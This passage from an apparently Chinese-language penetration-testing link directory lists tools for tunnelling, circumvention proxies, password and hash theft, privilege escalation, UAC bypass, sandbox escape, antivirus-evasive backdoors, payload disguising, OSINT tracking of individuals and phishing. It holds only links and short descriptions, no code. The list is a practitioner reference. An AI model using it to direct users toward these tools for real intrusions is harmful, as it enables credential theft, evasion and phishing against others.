href="https://github.com/knownsec/rtcp">https://github.com/knownsec/rtcp</a> Socket 端口转发，用于远程维护</p></li><li><p><a href="https://github.com/davrodpin/mole">https://github.com/davrodpin/mole</a> 基于 ssh 的端口转发</p></li><li><p><a href="http://rootkiter.com/EarthWorm">http://rootkiter.com/EarthWorm</a> 一款用于开启 SOCKS v5 代理服务的工具，基于标准 C 开发，可提供多平台间的转接通讯，用于复杂网络环境下的数据转发。</p></li><li><p><a href="http://rootkiter.com/Termite/README.txt">http://rootkiter.com/Termite/README.txt</a> EarthWorm 升级版，可以实现多节点跳跃</p></li><li><p><a href="https://github.com/SECFORCE/Tunna">https://github.com/SECFORCE/Tunna</a> 可以通过 HTTP 封装隧道通信任何 TCP，以及用于绕过防火墙环境中的网络限制</p></li><li><p><a href="https://github.com/fbkcs/thunderdns">https://github.com/fbkcs/thunderdns</a> 将 tcp 流量通过 DNS 协议转发，不需要客户端和 socket5 支持</p></li><li><p><a href="https://github.com/sensepost/reGeorg">https://github.com/sensepost/reGeorg</a> reDuh 的升级版，主要是把内网服务器的端口通过 http/https 隧道转发到本机，形成一个回路。用于目标服务器在内网或做了端口策略的情况下连接目标服务器内部开放端口（提供了 php，asp，jsp 脚本的正反向代理）</p></li><li><p><a href="https://github.com/SpiderClub/haipproxy">https://github.com/SpiderClub/haipproxy</a> py3,Scrapy and Redis,高可用 ip 代理池</p></li><li><p><a href="https://github.com/chenjiandongx/async-proxy-pool">https://github.com/chenjiandongx/async-proxy-pool</a> py3 异步爬虫 ip 代理池</p></li><li><p><a href="https://github.com/audibleblink/doxycannon">https://github.com/audibleblink/doxycannon</a> 使用一个 openvpn 代理池，为每一个生成 docker，当连接某一个 vpn 后，其它的进行 socks5 转发做流量分发</p></li><li><p><a href="https://github.com/decoder-it/psportfwd">https://github.com/decoder-it/psportfwd</a> PowerShell 编写的端口转发工具, 无需 admin 权限</p></li><li><p><a href="https://github.com/ls0f/gortcp">https://github.com/ls0f/gortcp</a> go，通过主控端、中转、被控端实现内网穿透</p></li></ul><h2 id="Cross-超越边界-NPV"><a href="#Cross-超越边界-NPV" class="headerlink" title="Cross 超越边界 NPV#"></a><strong>Cross 超越边界 NPV</strong>#</h2><ul><li><p><a href="https://github.com/bannedbook/fanqiang/wiki">https://github.com/bannedbook/fanqiang/wiki</a> cross 汇总</p></li><li><p><a href="https://github.com/teddysun/across">https://github.com/teddysun/across</a> 梯子搭建</p></li><li><p><a href="https://github.com/ToyoDAdoubi/doubi">https://github.com/ToyoDAdoubi/doubi</a> 各种常用一键脚本</p></li><li><p><a href="https://github.com/Nyr/openvpn-install">https://github.com/Nyr/openvpn-install</a> openvpn 一键</p></li><li><p><a href="https://github.com/quericy/one-key-ikev2-vpn">https://github.com/quericy/one-key-ikev2-vpn</a> CentOS/Debian/Ubuntu 一键安装 IPSEC/IKEV2 VPN 脚本</p></li><li><p><a href="https://github.com/teddysun/shadowsocks_install">https://github.com/teddysun/shadowsocks_install</a> shadowsocks,shadowsocksr</p></li><li><p><a href="https://github.com/guyingbo/shadowproxy">https://github.com/guyingbo/shadowproxy</a> ss/socks5/http//https 等多种代理</p></li><li><p><a href="https://github.com/shadowsocks/shadowsocks-manager">https://github.com/shadowsocks/shadowsocks-manager</a> shadowsocks 多用户管理</p></li><li><p><a href="https://github.com/leitbogioro/SSR.Go">https://github.com/leitbogioro/SSR.Go</a> shadowsocksrr 配置管理简化工具</p></li><li><p><a href="https://github.com/ssrpanel/SSRPanel">https://github.com/ssrpanel/SSRPanel</a> ss\ssr\v2ray 用户分布式管理</p></li><li><p><a href="https://github.com/xuanhuan/ss-panel">https://github.com/xuanhuan/ss-panel</a> ss 用户分布式管理</p></li><li><p><a href="https://github.com/Ahref-Group/SS-Panel-smarty-Edition">https://github.com/Ahref-Group/SS-Panel-smarty-Edition</a> ss 用户分布式管理，兑换码功能、商城系统，服务器信息</p></li><li><p><a href="https://github.com/Ccapton/brook-web">https://github.com/Ccapton/brook-web</a> brook 程序服务端 Web 后台管理服务器（Linux|MacOS），基于 python、flask、flask-restful</p></li><li><p><a href="https://github.com/Ccapton/brook-ok">https://github.com/Ccapton/brook-ok</a> Brook 一键安装脚本</p></li><li><p><a href="https://github.com/txthinking/brook">https://github.com/txthinking/brook</a> go，支持 Linux/MacOS/Windows/Android/iOS 的代理与 vpn</p></li><li><p><a href="https://github.com/gwuhaolin/lightsocks">https://github.com/gwuhaolin/lightsocks</a> 轻量级网络混淆代理，基于 SOCKS5 协议，类 SS</p></li><li><p><a href="https://github.com/Umbrellazc/BypassCampusNet">https://github.com/Umbrellazc/BypassCampusNet</a> 校园网防断网; UDP 53 免流上网</p></li><li><p><a href="https://doub.io/dbrj-5/">https://doub.io/dbrj-5/</a> 通过虚拟网卡转为类 VPN 全局代理 SSTAP，还有 sockscap64，比 proxifier 使用简单</p></li><li><p><a href="https://github.com/ntkernel/lantern">https://github.com/ntkernel/lantern</a> unlimited-landeng-for-win，无限流量蓝灯</p></li><li><p><a href="https://www.psiphon3.com/">https://www.psiphon3.com</a> 开源赛风超越边界代理</p></li><li><p><a href="https://hide.me/">https://hide.me</a> 可试用</p></li><li><p><a href="https://windscribe.com/">https://windscribe.com</a> 可试用</p></li><li><p><a href="http://www.vpngate.net/">http://www.vpngate.net</a> 日本国立筑波大学超越边界代理</p></li><li><p><a href="https://rava.app/">https://rava.app</a> 注册可免费用一天</p></li></ul><h2 id="横向移动与密码-Hash-窃取"><a href="#横向移动与密码-Hash-窃取" class="headerlink" title="横向移动与密码 Hash 窃取#"></a><strong>横向移动与密码 Hash 窃取</strong>#</h2><ul><li><p><a href="http://www.oxid.it/cain.html">http://www.oxid.it/cain.html</a> Cain &amp; Abel 支持密码还原、arp 中间人攻击</p></li><li><p><a href="https://github.com/gentilkiwi/mimikatz">https://github.com/gentilkiwi/mimikatz</a> Windows 下以抓取密码为主的横向移动神器</p></li><li><p><a href="https://github.com/skelsec/pypykatz">https://github.com/skelsec/pypykatz</a> 使用纯 py3 实现的 mimikatz</p></li><li><p><a href="https://github.com/eladshamir/Internal-Monologue">https://github.com/eladshamir/Internal-Monologue</a> 无需 LSASS 进程使用 Mimikatz 从 LSASS 进程内存中提取内容, 从内存中提取明文密码, NTLM 哈希, Kerberos ticket, 以及执行 pass-the-hash/pass-the-ticket 攻击等</p></li><li><p><a href="https://github.com/AlessandroZ/LaZagne">https://github.com/AlessandroZ/LaZagne</a> py3，密码抓取工具</p></li><li><p><a href="https://github.com/AlessandroZ/LaZagneForensic">https://github.com/AlessandroZ/LaZagneForensic</a> LaZagne 密码破解升级版，利用 DPAPI，目前缺陷是需要 windows user 密码</p></li><li><p><a href="https://github.com/twelvesec/passcat">https://github.com/twelvesec/passcat</a> Windows 下密码抓取工具</p></li><li><p><a href="https://github.com/huntergregal/mimipenguin">https://github.com/huntergregal/mimipenguin</a> linux 密码抓取神器</p></li><li><p><a href="https://github.com/quarkslab/quarkspwdump">https://github.com/quarkslab/quarkspwdump</a> quarkslab 出品的密码抓取工具，不用注入任何进程</p></li><li><p><a href="https://github.com/mthbernardes/sshLooter">https://github.com/mthbernardes/sshLooter</a> 从 ssh 服务中窃取用户名密码</p></li><li><p><a href="https://github.com/nettitude/Invoke-PowerThIEf">https://github.com/nettitude/Invoke-PowerThIEf</a> 利用 IE 进行后渗透，抓取密码、重定向等</p></li><li><p><a href="https://github.com/GhostPack/Rubeus">https://github.com/GhostPack/Rubeus</a> 操作 Kerberos 的库, 实现了 Kekeo 的大部分功能, C#编写</p></li><li><p><a href="https://github.com/m8r0wn/ldap_search">https://github.com/m8r0wn/ldap_search</a> PY,通过 ldap（轻量目录访问协议）认证，列举 win 域信息，爆破登录</p></li></ul><h2 id="Linux-提权相关"><a href="#Linux-提权相关" class="headerlink" title="Linux 提权相关#"></a><strong>Linux 提权相关</strong>#</h2><ul><li><p><a href="https://github.com/AlessandroZ/BeRoot">https://github.com/AlessandroZ/BeRoot</a> py,通过检查常见的错误配置来查找提权方法. 支持 Windows/Linux/Mac</p></li><li><p><a href="https://github.com/mschwager/0wned">https://github.com/mschwager/0wned</a> 利用 python 包进行高权限用户创建</p></li><li><p><a href="https://github.com/mzet-/linux-exploit-suggester">https://github.com/mzet-/linux-exploit-suggester</a> 查找 linux 有哪些补丁没有打的脚本</p></li><li><p><a href="https://github.com/belane/linux-soft-exploit-suggester">https://github.com/belane/linux-soft-exploit-suggester</a> 查找 linux 有哪些有漏洞的软件</p></li><li><p><a href="https://github.com/dirtycow/dirtycow.github.io">https://github.com/dirtycow/dirtycow.github.io</a> 脏牛提权漏洞 exp</p></li><li><p><a href="https://github.com/FireFart/dirtycow">https://github.com/FireFart/dirtycow</a> 脏牛提权漏洞 exp</p></li><li><p><a href="https://github.com/stanleyb0y/sushell">https://github.com/stanleyb0y/sushell</a> 利用 su 小偷实现低权限用户窃取 root 用户口令</p></li><li><p><a href="https://github.com/jas502n/CVE-2018-17182/">https://github.com/jas502n/CVE-2018-17182/</a> Linux 内核 VMA-UAF 提权漏洞 CVE-2018-17182</p></li><li><p><a href="https://github.com/jas502n/CVE-2018-14665">https://github.com/jas502n/CVE-2018-14665</a> CVE-2018-14665，linux 下 Xorg X 服务器提权利用</p></li><li><p><a href="https://github.com/nmulasmajic/syscall_exploit_CVE-2018-8897">https://github.com/nmulasmajic/syscall_exploit_CVE-2018-8897</a> Linux 系统利用 Syscall 实现提权</p></li><li><p><a href="https://github.com/can1357/CVE-2018-8897">https://github.com/can1357/CVE-2018-8897</a> Linux 系统利用 Syscall 实现提权</p></li><li><p><a href="https://github.com/SecWiki/linux-kernel-exploits">https://github.com/SecWiki/linux-kernel-exploits</a> linux-kernel-exploits Linux 平台提权漏洞集合</p></li><li><p><a href="https://github.com/nilotpalbiswas/Auto-Root-Exploit">https://github.com/nilotpalbiswas/Auto-Root-Exploit</a> linux 自动提权脚本</p></li><li><p><a href="https://github.com/WazeHell/PE-Linux">https://github.com/WazeHell/PE-Linux</a> Linux 提权工具</p></li><li><p><a href="https://guif.re/linuxeop">https://guif.re/linuxeop</a> linux 提权命令集合</p></li></ul><h2 id="Windows-提权相关"><a href="#Windows-提权相关" class="headerlink" title="Windows 提权相关#"></a><strong>Windows 提权相关</strong>#</h2><ul><li><p><a href="http://www.fuzzysecurity.com/tutorials/16.html">http://www.fuzzysecurity.com/tutorials/16.html</a> windows 平台教程级提权参考文章</p></li><li><p><a href="https://github.com/SecWiki/windows-kernel-exploits">https://github.com/SecWiki/windows-kernel-exploits</a> Windows 平台提权漏洞 Exp 集合</p></li><li><p><a href="https://github.com/51x/WHP">https://github.com/51x/WHP</a> windows 下各种提权与利用工具</p></li><li><p><a href="https://github.com/rasta-mouse/Sherlock">https://github.com/rasta-mouse/Sherlock</a> win 提权漏洞验证</p></li><li><p><a href="https://github.com/WindowsExploits/Exploits">https://github.com/WindowsExploits/Exploits</a> 微软 CVE-2012-0217、CVE-2016-3309、CVE-2016-3371、CVE-2016-7255、CVE-2017-0213 提权利用</p></li><li><p><a href="https://github.com/decoder-it/lonelypotato">https://github.com/decoder-it/lonelypotato</a> RottenPotatoNG 变种，利用 NBNS 本地域名欺骗和 WPAD 代理欺骗提权</p></li><li><p><a href="https://github.com/ohpe/juicy-potato">https://github.com/ohpe/juicy-potato</a> RottenPotatoNG 变种，利用 com 对象、用户 token 进行提权</p></li><li><p><a href="https://github.com/foxglovesec/Potato">https://github.com/foxglovesec/Potato</a> RottenPotatoNG 变种，利用本地域名欺骗和代理欺骗提权</p></li><li><p><a href="https://github.com/DanMcInerney/icebreaker">https://github.com/DanMcInerney/icebreaker</a> 处于内网环境但又在 AD 环境之外，icebreaker 将会帮助你获取明文 Active Directory 凭据（活动目录存储在域控服务器可用于提权）</p></li><li><p><a href="https://github.com/hausec/ADAPE-Script">https://github.com/hausec/ADAPE-Script</a> Active Directory 权限提升脚本</p></li><li><p><a href="https://github.com/klionsec/BypassAV-AllThings">https://github.com/klionsec/BypassAV-AllThings</a> 利用 aspx 一句话配合提权 payload 提权</p></li><li><p><a href="https://github.com/St0rn/Windows-10-Exploit">https://github.com/St0rn/Windows-10-Exploit</a> msf 插件，win10 uac bypass</p></li><li><p><a href="https://github.com/sam-b/CVE-2014-4113">https://github.com/sam-b/CVE-2014-4113</a> 利用 Win32k.sys 内核漏洞进行提取，ms14-058</p></li><li><p><a href="https://github.com/breenmachine/RottenPotatoNG">https://github.com/breenmachine/RottenPotatoNG</a> 利用 NBNS 本地域名欺骗和 WPAD 代理欺骗提权</p></li><li><p><a href="https://github.com/unamer/CVE-2018-8120">https://github.com/unamer/CVE-2018-8120</a> 影响 Win32k 组件，针对 win7 和 win2008 提权</p></li><li><p><a href="https://github.com/alpha1ab/CVE-2018-8120">https://github.com/alpha1ab/CVE-2018-8120</a> 在 win7 与 win2k8 的基础上增加了 winXP 与 win2k3</p></li><li><p><a href="https://github.com/0xbadjuju/Tokenvator">https://github.com/0xbadjuju/Tokenvator</a> 使用 Windows 令牌提升权限的工具，提供一个交互命令行界面</p></li></ul><h2 id="权限绕过"><a href="#权限绕过" class="headerlink" title="权限绕过#"></a><strong>权限绕过</strong>#</h2><ul><li><p><a href="https://payloads.online/archivers/2018-12-22/1">https://payloads.online/archivers/2018-12-22/1</a> DLL Hijacking &amp; COM Hijacking ByPass UAC - 议题解读</p></li><li><p><a href="https://github.com/tyranid/DotNetToJScript">https://github.com/tyranid/DotNetToJScript</a> 能够利用 JS/Vbs 脚本加载.Net 程序的工具</p></li><li><p><a href="https://github.com/mdsecactivebreach/SharpPack">https://github.com/mdsecactivebreach/SharpPack</a> 绕过系统应用白名单执行 DotNet and PowerShell tools</p></li><li><p><a href="https://github.com/rootm0s/WinPwnage">https://github.com/rootm0s/WinPwnage</a> py2，win 下权限提升，uac 绕过，dll 注入等</p></li><li><p><a href="https://github.com/hfiref0x/UACME">https://github.com/hfiref0x/UACME</a> 包含许多用于多个版本操作系统上绕过 Windows 用户帐户控制的方法</p></li><li><p><a href="https://github.com/Ben0xA/nps">https://github.com/Ben0xA/nps</a> 实现了不使用 powershell.exe 的情况下执行 powershell 命令</p></li><li><p><a href="https://github.com/Mr-Un1k0d3r/PowerLessShell">https://github.com/Mr-Un1k0d3r/PowerLessShell</a> 实现了不调用 powershell.exe 的情况下执行 powershell 命令</p></li><li><p><a href="https://github.com/p3nt4/PowerShdll">https://github.com/p3nt4/PowerShdll</a> 使用 rundll32 运行 PowerShell，绕过软件限制</p></li><li><p><a href="https://github.com/ionescu007/r0ak">https://github.com/ionescu007/r0ak</a> 内核层的瑞士军刀. 在 Windows10 内核中读/写/执行代码</p></li><li><p><a href="https://github.com/leechristensen/UnmanagedPowerShell">https://github.com/leechristensen/UnmanagedPowerShell</a> 从一个非托管程序来执行 PowerShell,经过一些修改后可以被用来注入到其他进程</p></li><li><p><a href="https://github.com/stephenfewer/ReflectiveDLLInjection">https://github.com/stephenfewer/ReflectiveDLLInjection</a> 一种库注入技术，让 DLL 自身不使用 LoadLibraryA 函数,将自身映射到目标进程内存中</p></li><li><p><a href="https://github.com/ChrisAD/ads-payload">https://github.com/ChrisAD/ads-payload</a> 利用环境变量与 destop.ini 绕过 windows 下的 Palo Alto Traps endpoint 防护软件</p></li><li><p><a href="https://github.com/Zer0Mem0ry/RunPE">https://github.com/Zer0Mem0ry/RunPE</a> 通过内存读取，网络传输内容，利用 PE 执行 shellcode</p></li></ul><h2 id="沙盒逃逸"><a href="#沙盒逃逸" class="headerlink" title="沙盒逃逸#"></a><strong>沙盒逃逸</strong>#</h2><ul><li><p><a href="https://github.com/hacksysteam/WpadEscape">https://github.com/hacksysteam/WpadEscape</a> 利用 wpad 进行浏览器 sandbox 沙箱逃逸</p></li><li><p><a href="https://github.com/unamer/vmware_escape">https://github.com/unamer/vmware_escape</a> vmware 虚拟机逃逸。CVE-2017-4901，CVE-2018-6981，CVE-2018-6982</p></li><li><p><a href="https://github.com/MorteNoir1/virtualbox_e1000_0day">https://github.com/MorteNoir1/virtualbox_e1000_0day</a> VirtualBox E1000 Guest-to-Host Escape 逃逸。教程</p></li><li><p><a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=1682&amp;desc=2">https://bugs.chromium.org/p/project-zero/issues/detail?id=1682&amp;desc=2</a> Ghostscript：基于漏洞 CVE-2018-17961 的-dSAFER 沙盒逃逸技术</p></li></ul><h2 id="后门免杀代码混淆"><a href="#后门免杀代码混淆" class="headerlink" title="后门免杀代码混淆#"></a><strong>后门免杀代码混淆</strong>#</h2><ul><li><p><a href="https://www.shellterproject.com/">https://www.shellterproject.com</a> 杀毒软件绕过</p></li><li><p><a href="https://github.com/trustedsec/unicorn">https://github.com/trustedsec/unicorn</a> py，一键生成多种后门</p></li><li><p><a href="https://github.com/islamTaha12/Python-Rootkit">https://github.com/islamTaha12/Python-Rootkit</a> windows 下 rootkit，反弹 meterpreter</p></li><li><p><a href="https://github.com/n00py/Hwacha">https://github.com/n00py/Hwacha</a> linux 下快速生成 metepreter 等多种 payload</p></li><li><p><a href="https://github.com/Screetsec/Vegile">https://github.com/Screetsec/Vegile</a> msf 免杀，程序注入</p></li><li><p><a href="https://github.com/MohamedNourTN/Terminator">https://github.com/MohamedNourTN/Terminator</a> py2，msf 免杀</p></li><li><p><a href="https://github.com/Veil-Framework/Veil">https://github.com/Veil-Framework/Veil</a> msf 免杀</p></li><li><p><a href="https://github.com/abedalqaderswedan1/aswcrypter">https://github.com/abedalqaderswedan1/aswcrypter</a> py、bash，msf 免杀</p></li><li><p><a href="https://github.com/Screetsec/TheFatRat">https://github.com/Screetsec/TheFatRat</a> java，msf 免杀，利用 searchsploit 快速搜索</p></li><li><p><a href="https://github.com/pasahitz/zirikatu">https://github.com/pasahitz/zirikatu</a> msf 免杀</p></li><li><p><a href="https://github.com/govolution/avet">https://github.com/govolution/avet</a> msf 免杀</p></li><li><p><a href="https://github.com/GreatSCT/GreatSCT">https://github.com/GreatSCT/GreatSCT</a> msf 免杀</p></li><li><p><a href="https://github.com/EgeBalci/HERCULES">https://github.com/EgeBalci/HERCULES</a> msf 免杀</p></li><li><p><a href="https://github.com/trustedsec/nps_payload">https://github.com/trustedsec/nps_payload</a> msf 免杀</p></li><li><p><a href="https://github.com/4w4k3/Insanity-Framework">https://github.com/4w4k3/Insanity-Framework</a> py，payload 生成，过杀软，识别虚拟机，钓鱼，内存注入等</p></li><li><p><a href="https://github.com/hlldz/SpookFlare">https://github.com/hlldz/SpookFlare</a> Meterpreter，Empire，Koadic 等 loader/dropper 的生成器，可以绕过客户端检测和网络端检测的端点策略</p></li><li><p><a href="https://github.com/pasahitz/regsvr32">https://github.com/pasahitz/regsvr32</a> 使用 C#+Empire 实现最小体积免杀后门</p></li><li><p><a href="https://github.com/malcomvetter/UnstoppableService">https://github.com/malcomvetter/UnstoppableService</a> 将自身安装为 Windows 服务且管理员无法停止/暂停服务的程序. C#编写</p></li><li><p><a href="https://github.com/Cn33liz/StarFighters">https://github.com/Cn33liz/StarFighters</a> 基于 DotNetToJScript，利用 JavaScript 和 VBScript 执行 Empire Launcher</p></li><li><p><a href="https://github.com/mdsecactivebreach/SharpShooter">https://github.com/mdsecactivebreach/SharpShooter</a> 基于 DotNetToJScript 使用 js、vbs，用于检索和执行任意 CSharp 源码的 payload 创建框架</p></li><li><p><a href="https://github.com/mdsecactivebreach/CACTUSTORCH">https://github.com/mdsecactivebreach/CACTUSTORCH</a> 基于 DotNetToJScript 使用 js、vbs 生成恶意 payload</p></li><li><p><a href="https://github.com/OmerYa/Invisi-Shell">https://github.com/OmerYa/Invisi-Shell</a> 对 powershell 文件进行混淆</p></li><li><p><a href="https://github.com/danielbohannon/Invoke-DOSfuscation">https://github.com/danielbohannon/Invoke-DOSfuscation</a> 对 powershell 文件进行混淆，加密操作以及重新编码</p></li><li><p><a href="https://github.com/danielbohannon/Invoke-Obfuscation">https://github.com/danielbohannon/Invoke-Obfuscation</a> 对 powershell 文件进行混淆，加密操作以及重新编码</p></li><li><p><a href="https://github.com/Mr-Un1k0d3r/SCT-obfuscator">https://github.com/Mr-Un1k0d3r/SCT-obfuscator</a> Cobalt Strike SCT 有效载荷混淆器</p></li><li><p><a href="https://github.com/tokyoneon/Armor">https://github.com/tokyoneon/Armor</a> bash，生成加密 Payload 在 macOS 上反弹 Shell</p></li><li><p><a href="https://github.com/Mr-Un1k0d3r/MaliciousMacroGenerator">https://github.com/Mr-Un1k0d3r/MaliciousMacroGenerator</a> 宏混淆，其中还包括 AV/Sandboxes 逃避机制</p></li><li><p><a href="https://github.com/Kkevsterrr/backdoorme">https://github.com/Kkevsterrr/backdoorme</a> py3、py2 多种类型的后门、shell 生成工具，可以自动维持权限</p></li><li><p><a href="https://github.com/TestingPens/MalwarePersistenceScripts">https://github.com/TestingPens/MalwarePersistenceScripts</a> win 下权限维持脚本</p></li><li><p><a href="https://github.com/mhaskar/Linux-Root-Kit">https://github.com/mhaskar/Linux-Root-Kit</a> py，simple，linux 下 rootkit</p></li><li><p><a href="https://github.com/PinkP4nther/Sutekh">https://github.com/PinkP4nther/Sutekh</a> simple，rootkit，使普通用户获取 root shell</p></li><li><p><a href="https://github.com/threatexpress/metatwin">https://github.com/threatexpress/metatwin</a> 从一个文件中提取元数据，包括数字签名，并注入到另一个文件中</p></li><li><p><a href="https://github.com/Mr-Un1k0d3r/Windows-SignedBinary">https://github.com/Mr-Un1k0d3r/Windows-SignedBinary</a> 可以修改二进制文件的 HASH，同时保留微软 windows 的签名</p></li><li><p><a href="https://github.com/secretsquirrel/SigThief">https://github.com/secretsquirrel/SigThief</a> py，用于劫持合法的数字签名并绕过 Windows 的哈希验证机制的脚本工具</p></li><li><p><a href="https://github.com/9aylas/Shortcut-Payload-Generator">https://github.com/9aylas/Shortcut-Payload-Generator</a> 快捷方式(.lnk)文件 Payload 生成器.AutoIt 编写</p></li><li><p><a href="https://github.com/GuestGuri/Rootkit">https://github.com/GuestGuri/Rootkit</a> 反弹一个 tcp 连接，将进程 id 绑定到一个空文件夹</p></li><li><p><a href="https://github.com/secretsquirrel/the-backdoor-factory">https://github.com/secretsquirrel/the-backdoor-factory</a> 可以生成 win32PE 后门测试程序,ELF 文件后门程序等</p></li></ul><h2 id="文件捆绑"><a href="#文件捆绑" class="headerlink" title="文件捆绑#"></a><strong>文件捆绑</strong>#</h2><ul><li><p>bat2exe.net 相类似也可以利用 iexpress 与 winrar 生成自解压 exe 可执行文件</p></li><li><p><a href="https://github.com/islamadel/bat2exe">https://github.com/islamadel/bat2exe</a> 将 bat 文件转换为 exe 二进制文件</p></li><li><p><a href="https://github.com/tywali/Bat2ExeConverter">https://github.com/tywali/Bat2ExeConverter</a> 将 bat 文件转换为 exe 二进制文件</p></li><li><p><a href="https://github.com/Juntalis/win32-bat2exe">https://github.com/Juntalis/win32-bat2exe</a> 将 bat 文件转换为 exe 二进制文件</p></li><li><p><a href="http://www.f2ko.de/downloads/Bat_To_Exe_Converter.zip">http://www.f2ko.de/downloads/Bat_To_Exe_Converter.zip</a> 将 bat 文件转换为 exe 二进制文件，可以隐藏窗口。</p></li><li><p><a href="https://github.com/r00t-3xp10it/trojanizer">https://github.com/r00t-3xp10it/trojanizer</a> 将两个可执行文件打包为自解压文件，自解压文件在执行时会执行可执行文件</p></li><li><p><a href="https://github.com/r00t-3xp10it/backdoorppt">https://github.com/r00t-3xp10it/backdoorppt</a> 将 payload 更换图标</p></li><li><p><a href="https://github.com/r00t-3xp10it/FakeImageExploiter">https://github.com/r00t-3xp10it/FakeImageExploiter</a> 将 payload 更换图标。需要 wine 与 resourcehacker 环境</p></li><li><p><a href="https://github.com/DamonMohammadbagher/FakeFileMaker">https://github.com/DamonMohammadbagher/FakeFileMaker</a> 更换图标和名称</p></li><li><p><a href="https://github.com/peewpw/Invoke-PSImage">https://github.com/peewpw/Invoke-PSImage</a> 将 PS 脚本隐藏进 PNG 像素中并用一行指令去执行它</p></li><li><p><a href="https://github.com/Mr-Un1k0d3r/DKMC">https://github.com/Mr-Un1k0d3r/DKMC</a> Don’t kill my cat 生成混淆的 shellcode，将 shellcode 存储在多语言图像中</p></li><li><p><a href="https://github.com/deepzec/Bad-Pdf">https://github.com/deepzec/Bad-Pdf</a> 生成一个 pdf 文件，内含 payload 来窃取 win 上的 Net-NTLM 哈希</p></li><li><p><a href="https://github.com/3gstudent/Worse-PDF">https://github.com/3gstudent/Worse-PDF</a> 向 PDF 文件中插入恶意代码，来窃取 win 上的 Net-NTLM 哈希</p></li></ul><h2 id="社工相关"><a href="#社工相关" class="headerlink" title="社工相关#"></a><strong>社工相关</strong>#</h2><ul><li><p><a href="https://github.com/brannondorsey/PassGAN">https://github.com/brannondorsey/PassGAN</a> py,深度学习,密码字典样本生成</p></li><li><p><a href="https://github.com/Mebus/cupp">https://github.com/Mebus/cupp</a> 根据用户习惯密码生成弱口令探测</p></li><li><p><a href="https://github.com/Saferman/cupper">https://github.com/Saferman/cupper</a> 根据用户习惯密码生成弱口令探测，楼上升级</p></li><li><p><a href="https://github.com/LandGrey/pydictor">https://github.com/LandGrey/pydictor</a> py3，特定密码字典生成</p></li><li><p><a href="https://github.com/mehulj94/Radium-Keylogger">https://github.com/mehulj94/Radium-Keylogger</a> python 下的键盘记录工具</p></li><li><p><a href="https://github.com/threatexpress/domainhunter">https://github.com/threatexpress/domainhunter</a> 检查过期域名，bluecoat 分类和 Archive.org 历史记录，以确定最为适合于钓鱼和 C2 的域名</p></li><li><p><a href="https://github.com/Mr-Un1k0d3r/CatMyPhish">https://github.com/Mr-Un1k0d3r/CatMyPhish</a> 收集目标类似的尚未注册的域名</p></li><li><p><a href="https://github.com/x0day/Multisearch-v2">https://github.com/x0day/Multisearch-v2</a> Bing、google、360、zoomeye 等搜索引擎聚合搜索，可用于发现企业被搜索引擎收录的敏感资产信息</p></li><li><p><a href="https://github.com/n0tr00t/Sreg">https://github.com/n0tr00t/Sreg</a> Sreg 可对使用者通过输入 email、phone、username 的返回用户注册的所有互联网护照信息。</p></li><li><p><a href="https://github.com/SpiderLabs/social_mapper">https://github.com/SpiderLabs/social_mapper</a> 社交媒体枚举和关联工具, 通过人脸识别关联人物侧写</p></li><li><p><a href="https://github.com/vysec/MaiInt">https://github.com/vysec/MaiInt</a> 公司雇员信息收集测试工具</p></li><li><p><a href="https://github.com/jofpin/trape">https://github.com/jofpin/trape</a> py，利用 OSINT 对人员进行追踪定位</p></li><li><p><a href="https://github.com/famavott/osint-scraper">https://github.com/famavott/osint-scraper</a> 输入人名或邮箱地址, 自动从互联网爬取关于此人的信息</p></li><li><p><a href="https://github.com/xHak9x/fbi">https://github.com/xHak9x/fbi</a> py2,facebook 脸书信息搜集工具</p></li><li><p><a href="https://github.com/initstring/linkedin2username">https://github.com/initstring/linkedin2username</a> 通过 Linkedin 领英获取相关公司员工列表</p></li><li><p><a href="https://github.com/0x09AL/raven">https://github.com/0x09AL/raven</a> linux 下领英 Linkedin information gathering tool</p></li><li><p><a href="https://github.com/Ridter/Mailget">https://github.com/Ridter/Mailget</a> 通过脉脉用户猜测企业邮箱</p></li><li><p><a href="https://github.com/haccer/tweep">https://github.com/haccer/tweep</a> 使用 twitter API 进行信息爬取查询</p></li><li><p><a href="https://github.com/MazenElzanaty/TwLocation">https://github.com/MazenElzanaty/TwLocation</a> py，获取 Twitter 用户发推的地址</p></li><li><p><a href="https://github.com/vaguileradiaz/tinfoleak">https://github.com/vaguileradiaz/tinfoleak</a> web 界面，对某人的 twitter 进行全面的情报分析</p></li><li><p><a href="https://github.com/deepfakes">https://github.com/deepfakes</a> 虚假音视频制作</p></li><li><p><a href="https://www.jianshu.com/p/147cf5414851">https://www.jianshu.com/p/147cf5414851</a> 聊聊那些常见的探侦类 APP</p></li><li><p><a href="https://github.com/thinkst/canarytokens">https://github.com/thinkst/canarytokens</a> 重要文件的追踪溯源，信标定位（<a href="https://canarytokens.org/generate#%EF%BC%89">https://canarytokens.org/generate#）</a></p></li><li><p><a href="https://github.com/ggerganov/kbd-audio">https://github.com/ggerganov/kbd-audio</a> c++,linux,利用麦克风监控键盘输入测试输入值</p></li></ul><h2 id="网站克隆镜像伪造"><a href="#网站克隆镜像伪造" class="headerlink" title="网站克隆镜像伪造#"></a><strong>网站克隆镜像伪造</strong>#</h2><ul><li><a href="http://www.httrack.com/">http://www.httrack.com</a> 网站克隆镜像</li></ul><h2 id="钓鱼框架邮件伪造"><a href="#钓鱼框架邮件伪造" class="headerlink" title="钓鱼框架邮件伪造#"></a><strong>钓鱼框架邮件伪造</strong>#</h2><ul><li><p><a href="https://github.com/bhdresh/SocialEngineeringPayloads">https://github.com/bhdresh/SocialEngineeringPayloads</a> 负责收集用于证书盗窃和鱼叉式网络钓鱼攻击的社交工程技巧和 payloads</p></li><li><p><a href="https://github.com/trustedsec/social-engineer-toolkit">https://github.com/trustedsec/social-engineer-toolkit</a> 专为社交工程设计的开源渗透测试框架</p></li><li><p><a href="https://github.com/thelinuxchoice/blackeye">https://github.com/thelinuxchoice/blackeye</a> 拥有 facebook、instagram 等三十余个钓鱼模板的一键启用工具</p></li><li><p><a href="https://github.com/M4cs/BlackEye-Python">https://github.com/M4cs/BlackEye-Python</a> 以 blackeye 为基础加强子域的管理</p></li><li><p><a href="https://github.com/azizaltuntas/Camelishing">https://github.com/azizaltuntas/Camelishing</a> py3，界面化社会工程学攻击辅助工具</p></li><li><p><a href="https://github.com/JonCooperWorks/judas">https://github.com/JonCooperWorks/judas</a> go，克隆网站钓鱼</p></li><li><p><a href="https://github.com/gophish/gophish">https://github.com/gophish/gophish</a> go，拥有在线模板设计、发送诱骗广告等功能的钓鱼系统</p></li><li><p><a href="https://github.com/tatanus/SPF">https://github.com/tatanus/SPF</a> py2，deefcon 